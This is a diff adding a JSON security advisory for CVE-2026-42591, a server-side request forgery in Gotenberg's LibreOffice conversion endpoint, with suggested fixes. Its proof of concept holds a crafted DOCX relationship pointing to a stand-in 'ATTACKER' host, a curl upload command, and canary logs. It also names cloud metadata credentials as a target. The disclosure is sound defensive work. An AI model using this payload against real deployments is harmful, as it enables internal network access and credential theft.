@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-rm4c-xj6x-49mw",
+  "modified": "2026-05-07T01:19:02.116044Z",
+  "published": "2026-05-07T00:57:03Z",
+  "aliases": [
+    "CVE-2026-42591"
+  ],
+  "summary": "Gotenberg has a Server-Side Request Forgery (SSRF) Issue",
+  "details": "### Summary\n\nThe SSRF hardening shipped in v8.31.0 only covers outbound URLs that Gotenberg's Go code handles — Chromium asset fetches, webhook delivery, and download-from. The LibreOffice conversion endpoint (`/forms/libreoffice/convert`) passes uploaded documents directly to LibreOffice without inspecting their content. LibreOffice then fetches any embedded external URLs on its own, completely bypassing the SSRF filters.\n\nThis was verified on v8.31.0 (latest at time of writing) with a crafted DOCX and got 3 outbound HTTP requests from LibreOffice to the canary server used for testing.\n\n### Details\n\nWhen a file is uploaded to `/forms/libreoffice/convert`, the route in `pkg/modules/libreoffice/routes.go` reads form parameters and passes the input file directly to `libreOffice.Pdf()`:\n\n```go\nerr = libreOffice.Pdf(ctx, ctx.Log(), inputPath, outputPaths[i], options)\n```\n\nThere's no content inspection happening before the file reaches LibreOffice. The SSRF protection in v8.31.0 (`pkg/gotenberg/outbound.go`) wraps Go's `http.Client` with a custom dialer that resolves URLs and rejects non-public IPs — but LibreOffice is a separate process that makes its own HTTP connections via libcurl. The Go-level dial hooks can't intercept that.\n\nOOXML formats like DOCX can embed external image references using `TargetMode=\"External\"` in relationship files. LibreOffice fetches those URLs during PDF conversion.\n\n**Suggested fix:** Run LibreOffice with `unshare --net` to drop all network access from the subprocess — no network namespace means no outbound requests regardless of file format. As defense in depth, scan uploaded OOXML files (which are ZIPs) for `_rels/*.rels` entries with `TargetMode=\"External\"` and validate/strip those URLs before passing the file to LibreOffice.\n\n### PoC\n\nBuild a minimal DOCX with an external image reference. DOCX files are ZIP archives, so you can construct one by hand.\n\n**`word/_rels/document.xml.rels`:**\n\n```xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e\n\u003cRelationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"\u003e\n  \u003cRelationship Id=\"rId10\"\n    Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\"\n    Target=\"http://ATTACKER:9877/ssrf\"\n    TargetMode=\"External\"/\u003e\n\u003c/Relationships\u003e\n```\n\n**`word/document.xml`** (references the external image via `r:link`):\n\n```xml\n\u003cw:drawing\u003e\n  \u003cwp:inline distT=\"0\" distB=\"0\" distL=\"0\" distR=\"0\"\u003e\n    \u003cwp:extent cx=\"914400\" cy=\"914400\"/\u003e\n    \u003cwp:docPr id=\"1\" name=\"Picture 1\"/\u003e\n    \u003ca:graphic\u003e\n      \u003ca:graphicData uri=\"http://schemas.openxmlformats.org/drawingml/2006/picture\"\u003e\n        \u003cpic:pic\u003e\n          \u003cpic:nvPicPr\u003e\n            \u003cpic:cNvPr id=\"1\" name=\"ssrf.png\"/\u003e\n            \u003cpic:cNvPicPr/\u003e\n          \u003c/pic:nvPicPr\u003e\n          \u003cpic:blipFill\u003e\n            \u003ca:blip r:link=\"rId10\"/\u003e\n            \u003ca:stretch\u003e\u003ca:fillRect/\u003e\u003c/a:stretch\u003e\n          \u003c/pic:blipFill\u003e\n          \u003cpic:spPr\u003e\n            \u003ca:xfrm\u003e\n              \u003ca:off x=\"0\" y=\"0\"/\u003e\n              \u003ca:ext cx=\"914400\" cy=\"914400\"/\u003e\n            \u003c/a:xfrm\u003e\n            \u003ca:prstGeom prst=\"rect\"\u003e\u003ca:avLst/\u003e\u003c/a:prstGeom\u003e\n          \u003c/pic:spPr\u003e\n        \u003c/pic:pic\u003e\n      \u003c/a:graphicData\u003e\n    \u003c/a:graphic\u003e\n  \u003c/wp:inline\u003e\n\u003c/w:drawing\u003e\n```\n\nPack into a valid DOCX zip and send:\n\n```sh\ncurl -s -o output.pdf \\\n  http://TARGET:3000/forms/libreoffice/convert \\\n  --form files=@ssrf_test.docx\n```\n\nCanary server immediately shows LibreOffice reaching out:\n\n```\nOPTIONS /GOTENBERG_SSRF HTTP/1.1\nHost: host.docker.internal:9877\nUser-Agent: LibreOffice 26.2.2.2 denylistedbackend/8.19.0 OpenSSL/3.5.5\nAccept: */*\nAccept-Encoding: deflate, gzip, br, zstd\n\nGET /GOTENBERG_SSRF HTTP/1.1\nHost: host.docker.internal:9877\nUser-Agent: LibreOffice 26.2.2.2 denylistedbackend/8.19.0 OpenSSL/3.5.5\nAccept: */*\nAccept-Encoding: deflate, gzip, br, zstd\n```\n\n3 requests total (OPTIONS + 2x GET) from a single conversion. Tested against `gotenberg/gotenberg:8.31.0`.\n\n### Impact\n\nLibreOffice makes full GET requests, so response data can be exfiltrated through the generated PDF:\n\n- Hit internal services — localhost, 10.x, 192.168.x, whatever the container can reach\n- Grab cloud metadata at `http://169.254.169.254/` (AWS/GCP/Azure IAM creds)\n- Port scan the internal network via response timing\n- The v8.31.0 SSRF hardening doesn't help here at all — it only covers Go HTTP calls, not LibreOffice's own connections\n\nAnything LibreOffice opens that can carry external refs is affected: `.docx`, `.docm`, `.xlsx`, `.xlsm`, `.pptx`, `.pptm`, `.odt`, `.ods`, `.odp`, `.rtf`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gotenberg/gotenberg/v8",
+        "purl": "pkg:golang/github.com/gotenberg/gotenberg/v8"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "8.31.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-rm4c-xj6x-49mw/GHSA-rm4c-xj6x-49mw.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/security/advisories/GHSA-rm4c-xj6x-49mw"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gotenberg/gotenberg"
+    }
+  ]
+}
